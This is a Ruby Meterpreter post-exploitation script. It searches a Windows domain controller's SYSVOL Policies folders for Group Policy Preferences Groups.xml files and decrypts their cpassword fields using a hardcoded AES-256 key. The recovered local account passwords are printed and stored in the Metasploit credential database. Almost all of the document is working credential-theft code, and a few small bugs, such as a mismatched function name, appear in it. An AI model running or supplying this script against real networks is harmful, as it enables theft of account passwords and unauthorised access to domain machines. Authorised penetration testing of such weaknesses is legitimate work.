## Meterpreter script that search for GPO local users password - win2k8
##
## Based on Gpprefdecrypt.py - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
##  http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences ( emilien girault )
##
## This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
## files matching a given pattern
##
## Provided by Loic Jaquemet - loic dot jaquemet at gmail.com


require 'nokogiri'
require 'base64'

def decrypt(cpassword)
	# Init the key
	# From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
	key = ["
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
".gsub(" ","").gsub("\n","")].to_a.pack("H*")

	cpassword += '='*((4 - cpassword.size.modulo(4)).modulo(4))
	encoded = Base64.decode64(cpassword)
	# decode
	aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
	aes.padding = 0
	aes.decrypt
	aes.key = key
	password = (aes.update(encoded) + aes.final)
	# take suffix out
	password = password[0..-(password[-1,1].unpack("C")[0]+1)]
	return password
end

LocalUser = Struct.new(:name, :cpassword, :action, :changeLogon, :noChange,
							:neverExpires, :acctDisabled, :subAuthority, :changed)
def parse_users(text)
	# parse the xml to find all users.
	doc = (REXML::Document.new text).root
	doc.elements.to_a("//User/Properties").each do |p|
		next if p.attributes["cpassword"].empty?
		localuser = LocalUser.new
		localuser.name = p.attributes["newName"]
		localuser.name = p.attributes["userName"] if localuser.name.empty?
		# UNICODE conversion
		localuser.cpassword = (decrypt p.attributes["cpassword"]).unpack('v*').pack('C*')
		localuser.action = p.attributes["action"]
		localuser.changeLogon = p.attributes["changeLogon"]
		localuser.noChange = p.attributes["noChange"]
		localuser.neverExpires = p.attributes["neverExpires"]
		localuser.acctDisabled = p.attributes["acctDisabled"]
		localuser.subAuthority = p.attributes["subAuthority"]
		localuser.changed = p.parent.attributes["changed"]
		yield localuser
	end
end

def scan_groups_file(groupsfile)
	# read the groups.xml
	begin
		if client.fs.file.stat(groupsfile).file?
			rfile = client.fs.file.new(groupsfile)
			temp = rfile.read
			# parse xml
			parse_user(temp) do |localuser|
				## store_creds
				client.framework.db.report_auth_info(
					:host  => client.sock.peerhost,
					:port  => 445,
					:sname => 'smb',
					:user  => localuser.name,
					:pass  => localuser.cpassword,
					)
				print_status "#{localuser.name}: #{localuser.cpassword}  -  #{localuser.changed} "
			end
		end
	rescue ::Rex::Post::Meterpreter::RequestError => e
		#print_line "Ignore protected dir #{policydir}"
		#return
	end
end

def search_groups_file(path)
	# search all groups.xml
	begin
		dirs = client.fs.dir.foreach(path)
	rescue ::Rex::Post::Meterpreter::RequestError => e
		print_error("Error scanning #{path}: #{$!}")
		return
	end

	dirs.each do |policydir|
		next if policydir =~ /^(\.|\.\.)$/
		fullpolicydir = path + '\\' + policydir
		if client.fs.file.stat(fullpolicydir).directory?
			groupsfile = fullpolicydir + '\\' + "Machine\\Preferences\\Groups\\Groups.xml"
			yield groupsfile
		end
	end
end


def get_domain_dc_url()
	# resolve dc name
	dc_url = nil
	begin
		subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
		v_name = "DCName"
		dc_url = registry_getvaldata(subkey,v_name)
		rescue
		print_error("This host is not part of a domain.")
		return nil
	end
	return dc_url
end



def scan_policies_path(server)
	#scan all policies
	if server.nil?
		server = get_domain_dc_url
	end

	dirname = "#{server}\\SYSVOL\\"
	dirsearch = "Policies"
	begin
		print_status "[+] Searching #{dirname}"
		dirs = client.fs.dir.foreach(dirname)
	rescue ::Rex::Post::Meterpreter::RequestError => e
		print_error("Error scanning #{path}: #{$!}")
		return
	end

	dirs.each do |dom|
		next if dom =~ /^(\.|\.\.)$/
		fullpath = dirname +  dom + '\\' + "Policies"

		if client.fs.file.stat(fullpath).directory?
			search_groups_file(fullpath) do |groupsfile|
				scan_groups_file groupsfile
			end
		end
	end
end


# Parsing of Options

server = nil

@@opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-s" => [ false,"SMB server name with a SYSVOL. Default is autolookup." ]
)

def usage
	print_line "gp_users_decrypt -- search for GPO local user password"
	print_line "USAGE: run gp_users_decrypt [-s servername]"
	print_line
	print_line(@@opts.usage)
	raise Rex::Script::Completed
end

@@opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-s"
		server = "\\\\#{val}"
	end
end

if client.platform =~ /win32|win64/
	if server == 0
		print_line "server needs to be specified"
		return
	end

	scan_policies_path(server)
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
